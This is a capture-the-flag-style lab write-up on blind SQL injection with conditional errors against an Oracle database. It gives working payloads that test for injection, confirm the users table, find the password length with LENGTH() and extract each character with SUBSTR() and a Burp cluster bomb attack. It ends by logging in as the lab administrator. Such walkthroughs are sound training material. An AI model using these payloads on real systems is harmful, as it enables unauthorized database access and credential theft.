**SQL Injection -- Lab #12 Blind SQL injection with conditional errors**

<img width="720" height="475" alt="image" src="https://github.com/user-attachments/assets/db4c1187-871f-470f-b1d4-cebe6e21e9a5" />

Lets start the Lab

<img width="640" height="376" alt="image" src="https://github.com/user-attachments/assets/4f00ccfc-9754-45eb-aa1c-c14139726473" />

Lets intercept the traffic in Burp suit.

<img width="640" height="309" alt="image" src="https://github.com/user-attachments/assets/8d8705f3-529e-4135-9b53-ffa62b575aea" />

**STEP 1:- We need to confirm if Database is vulnerable to SQLi**

As per the Lab description, the vulnerable parameter is Tracking ID

Lets validate.

We will add ' in the tracking ID and see if it breaks the query

<img width="640" height="283" alt="image" src="https://github.com/user-attachments/assets/5f125627-10f7-4254-bd5c-18b75a2f2f5f" />

We got an internal server error.

Now, let add one more ' and check. Adding one more ' will close the single quote and there should not be any error.


<img width="640" height="289" alt="image" src="https://github.com/user-attachments/assets/a215369d-8876-422e-9786-63fcc5c54ca6" />

And there is no error.

Now lets add concatenating character and add second query

' || (select ‘’) || '

|| (double pipe) → In many SQL dialects, || is the string concatenation operator.

<img width="640" height="257" alt="image" src="https://github.com/user-attachments/assets/59b2da08-c11d-4de3-b067-0a9520f18699" />

We got an error, which is weird. It may be because the database is not MySql. It could be any other Database.

Lets check for Oracle

' || (select ''FROM DUAL) || '

<img width="640" height="270" alt="image" src="https://github.com/user-attachments/assets/2e86789e-e412-4840-9586-d2b39d373ee0" />

We don't get an error. It confirms that we are dealing with Oracle Database and its should be vulnerable to SQLi

To confirm lets try to get any output from a table that does not exists

' || (select ‘’FROM DUALsdsds) || '

As there is no table as **DUALsdsds** we should get an error.

<img width="640" height="296" alt="image" src="https://github.com/user-attachments/assets/71106731-f1e7-4197-a52e-abc5d22f24b2" />

And we got the error. It confirms that the database is vulnerable to SQLi

**STEP 2:- Need to confirm if users table exists in the Database**

' || (select ‘’FROM users) || '

If the **users** table exists, we will get a 200 response. If not it will throw an error.

<img width="640" height="270" alt="image" src="https://github.com/user-attachments/assets/1c5de30d-6913-40bc-a9b2-36e918608d0c" />

We got an error message.

This could be because the quotes after select '' is

' || (select ‘’FROM users WHERE rownum=1) || '

<img width="640" height="296" alt="image" src="https://github.com/user-attachments/assets/b8a5225b-8beb-4a6c-9b23-d1ad5eba1bfc" />

We don't get any error, it means users table exists

**STEP 3:- Need to confirm if administrator table exists in the Database**

‘ || (SELECT ‘’ FROM users WHERE username=’administrator’) || ’

<img width="640" height="301" alt="image" src="https://github.com/user-attachments/assets/157d63b1-711b-4cdd-8943-d68a7f3a07f3" />

We got a 200 response. However if user administrator is not in the database it will not run the SELECT portion of the query. So it will not give an error either way and so we cannot tell if the database has user administrator.

Lets verity. We have added some random characters in administrator and we still get 200 response.

<img width="640" height="277" alt="image" src="https://github.com/user-attachments/assets/b6784fec-c97c-4107-aa88-1a8a86921a81" />

Now to confirm if administrator user exists, we will use case expression in Oracle. Its similar to the if-else-then statement.

Lets create the query

‘ || (select CASE WHEN (1=1) THEN _ ELSE _ END FROM DUAL) ||’

Now we are saying select CASE WHEN (1=1) then use TO_CHAR() function. Its an Oracle function that converts numbers into strings.

‘ || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END FROM DUAL) ||’

Inside TO_CHAR we have put 1/0 which is invalid and it will generate an error, else its just an empty string.

Lets understand the query

***' || (select CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END FROM DUAL) ||'***

So what we are doing here is when 1=1, which is always true, then perform TO_CHAR function which has an invalid parameter and it will throw an error.

<img width="640" height="304" alt="image" src="https://github.com/user-attachments/assets/270b6596-957f-44ad-93c4-9185aefd973b" />

Now, if we put WHEN (1=0) which is not true, then TO_CHAR(1/0) will not run and query will run ELSE statement and it will output an empty string (ELSE ‘’) which means we will get a 200 response as there is no error.

***‘ || (select CASE WHEN (1=0) THEN TO_CHAR (1/0) ELSE ‘’ END FROM DUAL) ||’***

<img width="640" height="297" alt="image" src="https://github.com/user-attachments/assets/c989fbee-f24a-4194-b2de-9e7ffcd6d591" />

Now, we have a way of getting an error based on the statement **CASE WHEN (condition).**

Now, we will take its advantage to determine of user administrator is there in the Database table or not.

**‘ || (SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END FROM users WHERE username=’administrator’) ||’**

Now, to understand why this query will help to determine if there is a user called administrator, we need to understand the sequence of running queries in Oracle.

**FROM** clause will be evaluated first then **SELECT** clause.

**FROM users WHERE username=’administrator’** >> So if the username administrator exists in the database, then SELECT section of the query will be performed.

***SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END***

Now in SELECT clause we have CASE WHEN (1=1) which is always true then it will perform TO_CHAR (1/0) which will generate an error.

So, if we get an error, we can confirm that user administrator exists in the database.

If there is no administrator, then SELECT section of the query will not be performed hence TO_CHAR(1/0) will not be performed and there will be no error.

Lets try both use case

***‘ || (SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END FROM users WHERE username=’administrator’) ||’***

<img width="640" height="307" alt="image" src="https://github.com/user-attachments/assets/c0c65ca0-b016-4d66-8919-09d1a6d4106c" />

We got an error, which means user administrator exists.

Lets try the other use case

<img width="640" height="280" alt="image" src="https://github.com/user-attachments/assets/f2820ae6-c833-4ab5-a0db-844d4f8d0d25" />

We have out a random username and we get a 200 response which means that this user does not exists in the database.

**STEP 4:- Need to determine the length of the password of the Administrator user.**

***‘ || (SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END FROM users WHERE username=’administrator’ and LENGTH(password)>1) ||’***

<img width="640" height="300" alt="image" src="https://github.com/user-attachments/assets/60d5d178-8fd5-47a8-8b9a-dc7d4106abf6" />

We got an error, which means administrator exists and length of its password is greater than 1.

Lets try a bigger number

<img width="640" height="277" alt="image" src="https://github.com/user-attachments/assets/44c58f64-d3b6-490a-a100-377d1cce0804" />

At 25, we get 200 response, which means the length of the password is less than 25.

Lets brakeforce the length of the password.

<img width="640" height="284" alt="image" src="https://github.com/user-attachments/assets/f98b9b4d-0526-4c97-8a2a-b7c9fb6d669d" />

<img width="640" height="266" alt="image" src="https://github.com/user-attachments/assets/63e02982-00d8-4924-a6aa-227ac24b56fd" />

From payload 20 we start getting 200 response code.

It means the length of the password is exactly 20 characters because at payload 19 the response is 500 which means the length is bigger than 19 and at payload 20 we got 200 response. So length is not bigger than 20 means its exact 20 characters.

**STEP 5:- Need to output the password of the Administrator user.**

We will check if the 1st character of the password is a or not.

***‘ || (SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE ‘’ END FROM users WHERE username=’administrator’ and SUBSTR(password, 1,1)=’a’) ||’***

Now, in the above query first WHERE clause will run. So if the username is administrator and its 1st letter is a, only then SELECT clause will run. And when SELECT clause run, 1=1 is always true then TO_CHAR (1/0) will run which will throw an error.

So in simple terms, if the 1st character is a, then there will be an error, if its not a we will get 200 response.

Lets validate

<img width="640" height="273" alt="image" src="https://github.com/user-attachments/assets/a682e878-bc7f-4ca6-a33e-e44440e902c5" />

We got a 200 response which means the 1st character of the password is not a.

Then we will check if 1st character is b. If we get a 200 response, it means its not b either. Then we will check for c, then for d and so on.

<img width="640" height="258" alt="image" src="https://github.com/user-attachments/assets/65fd5775-3045-494e-bd61-febe098c7e08" />

<img width="640" height="277" alt="image" src="https://github.com/user-attachments/assets/b2f75765-090e-4620-a9d2-b9a795dbd15f" />

We got a 500 response code for 8, which means the 1st character is 8.

Now we need to perform this attack for 2nd character, then for 3rd character and so on.

So instead of going it 20 times we will use cluster bomb attack.

<img width="640" height="244" alt="image" src="https://github.com/user-attachments/assets/e7b9e82b-6802-4993-bf12-2fa326f6706e" />

<img width="720" height="272" alt="image" src="https://github.com/user-attachments/assets/099df3a9-5eac-433f-8dc1-31add84c9abb" />

Lets start the attack

<img width="640" height="325" alt="image" src="https://github.com/user-attachments/assets/adc3e40d-5213-4638-8028-c6618851ba2a" />

When scan is finished, we will short the result by Status code.

<img width="640" height="144" alt="image" src="https://github.com/user-attachments/assets/3fa233a1-47c5-4f45-9f1a-59b62d369911" />

Status code having 500 has the characters of the password. We can arrange the characters as per payload 1 and we will get the password

xsx2jsf9wzkcs92aedrb

NOTE: As the lab was restarted multiple times, the administrator password keeps on changing on each restart. So this password does not start with 8.

Lets try to login with administrator.

<img width="640" height="301" alt="image" src="https://github.com/user-attachments/assets/67a9ffdd-553d-4609-83d8-eccece5665f9" />

And Lab is solved !!!!


